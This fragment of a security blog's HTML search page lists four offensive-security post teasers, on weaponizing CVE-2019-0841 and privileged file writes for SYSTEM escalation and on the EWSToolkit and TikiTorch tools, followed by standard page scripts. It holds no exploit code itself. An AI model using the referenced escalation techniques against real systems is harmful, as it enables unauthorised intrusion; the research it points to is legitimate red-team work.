              <a class="link-unstyled" href="https://rastamouse.me/2019/04/weaponizing-privileged-file-writes-with-windows-collector-service/">
                <h3 class="media-heading">Weaponizing Privileged File Writes with Windows Collector Service</h3>
              </a>
              <span class="media-meta">
                <span class="media-date text-small">
                  Apr 4, 2019
                </span>
              </span>
              <div class="media-content hide-xs font-merryweather"><p>In my <a href="https://rastamouse.me/2019/04/weaponizing-cve-2019-0841-with-laps/">previous post</a>, I described how one could leverage CVE-2019-0841 to backdoor the LAPS <code>AdmPwd.dll</code> for EoP to <code>NT AUTHORITY\SYSTEM</code>.  The obvious question is that if a machine is not using LAPS, what can you do&hellip;?  Well <a href="https://twitter.com/buffaloverflow">Rich Warren</a> provided <a href="https://twitter.com/buffaloverflow/status/1117507864824881153">one solution</a>, by using the Windows Diagnostics Hub Standard Collector Service.</p></div>
            </div>
            <div style="clear:both;"></div>
            <hr>
          </div>
        
          <div class="media">
            
            <div class="media-body">
              <a class="link-unstyled" href="https://rastamouse.me/2019/04/weaponizing-cve-2019-0841-with-laps/">
                <h3 class="media-heading">Weaponizing CVE-2019-0841 with LAPS</h3>
              </a>
              <span class="media-meta">
                <span class="media-date text-small">
                  Apr 4, 2019
                </span>
              </span>
              <div class="media-content hide-xs font-merryweather"><p>On April 9, <a href="https://twitter.com/rogue_kdc">Nabeel Ahmed</a> <a href="https://twitter.com/rogue_kdc/status/1115664188821639173">annouced</a> details of <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-0841">CVE-2019-0841</a> - the tl;dr being that it allows low privileged users to take Full Control of files owned by <code>NT AUTHORITY\SYSTEM</code>, which can lead to EoP.  Nabeel published a comprehensive <a href="https://krbtgt.pw/dacl-permissions-overwrite-privilege-escalation-cve-2019-0841/">blog</a> describing the vulnerability, <a href="https://github.com/rogue-kdc">PoC code</a> and a <a href="https://youtu.be/vP468ZjJ3hU">video demonstration</a>.</p></div>
            </div>
            <div style="clear:both;"></div>
            <hr>
          </div>
        
          <div class="media">
            
            <div class="media-body">
              <a class="link-unstyled" href="https://rastamouse.me/2019/03/ews-installapp/">
                <h3 class="media-heading">EWS - InstallApp</h3>
              </a>
              <span class="media-meta">
                <span class="media-date text-small">
                  Mar 3, 2019
                </span>
              </span>
              <div class="media-content hide-xs font-merryweather"><p>I recently created the <a href="https://github.com/rasta-mouse/EWSToolkit">EWSToolkit</a> off the back of an assessment for Exchange Client Access Services.  I realise I committed it with basically no explanation, so this blog post will serve as a quick introduction and a look at perhaps one of its more interesting features.</p></div>
            </div>
            <div style="clear:both;"></div>
            <hr>
          </div>
        
          <div class="media">
            
            <div class="media-body">
              <a class="link-unstyled" href="https://rastamouse.me/2019/03/tikitorch/">
                <h3 class="media-heading">TikiTorch</h3>
              </a>
              <span class="media-meta">
                <span class="media-date text-small">
                  Mar 3, 2019
                </span>
              </span>
              <div class="media-content hide-xs font-merryweather"><p>When TikiTorch was <a href="https://github.com/rasta-mouse/TikiTorch/tree/882cbd1d74e9ddcfb3409f6d5a200f03beb79e7a">first released</a> in February, it consisted of a single .NET assembly.  Almost exactly a month later, I <a href="https://github.com/rasta-mouse/TikiTorch/tree/3116ad0cbb4343bcc720f1e850b08d938971cd9c">commited</a> an update that increased that to four assemblies.</p>

<p>This blog post will cover what these assemblies are and how to use them.</p></div>
            </div>
            <div style="clear:both;"></div>
            <hr>
          </div>
        
      </div>
    </div>
    <div class="modal-footer">
      <p class="results-count text-medium"
         data-message-zero="no post found"
         data-message-one="1 post found"
         data-message-other="{n} posts found">
         33 posts found
      </p>
    </div>
  </div>
</div>
    
  
    
    <div id="cover" style="background-image:url('https://rastamouse.me/images/cover.jpg');"></div>
  


    
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.8.0/highlight.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/jquery.fancybox.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/helpers/jquery.fancybox-thumbs.min.js"></script>


<script src="https://rastamouse.me/js/script-wl33z0n6ocaypepiqrazthtivfrliqijej4rq8ek8gvrv1awftmgjuv8k4zc.min.js"></script>

<script>
$(document).ready(function() {
  hljs.configure({ classPrefix: '', useBR: false });
  $('pre.code-highlight').each(function(i, block) {
    var code = "";
    hljs.highlightAuto(block.innerText).value.split(/\r\n|\r|\n/).forEach(function(line) {
      code += "<span class=\"line\">" + line + "</span><br>";
    });
    if (code.length > 0) {
      block.innerHTML = code;  
    }
  });
  $('pre > code').each(function(i, block) {
    $(this).addClass('codeblock');
    hljs.highlightBlock(block);
  });
});
</script>

  
    
      <script>
        var disqus_config = function () {
          this.page.url = 'https:\/\/rastamouse.me\/2018\/03\/a-view-of-persistence\/';
          
            this.page.identifier = '\/2018\/03\/a-view-of-persistence\/'
          
        };
        (function() {
          
          
          if (window.location.hostname == "localhost") {
            return;
          }
          var d = document, s = d.createElement('script');
          var disqus_shortname = 'rastamouse';
          s.src = '//' + disqus_shortname + '.disqus.com/embed.js';

          s.setAttribute('data-timestamp', +new Date());
          (d.head || d.body).appendChild(s);
        })();
      </script>
    
  





    
  </body>
</html>

